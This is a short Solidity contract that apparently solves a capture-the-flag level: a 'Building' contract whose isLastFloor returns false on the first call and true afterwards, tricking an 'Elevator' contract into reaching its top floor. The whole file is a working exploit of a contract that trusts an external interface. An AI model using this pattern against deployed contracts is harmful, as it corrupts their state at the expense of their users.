// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract Building {
    Elevator src;

    bool called = false;

    constructor(address _src) {
        src = Elevator(_src);
    }

    function attack() public {
        src.goTo(10);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }
}
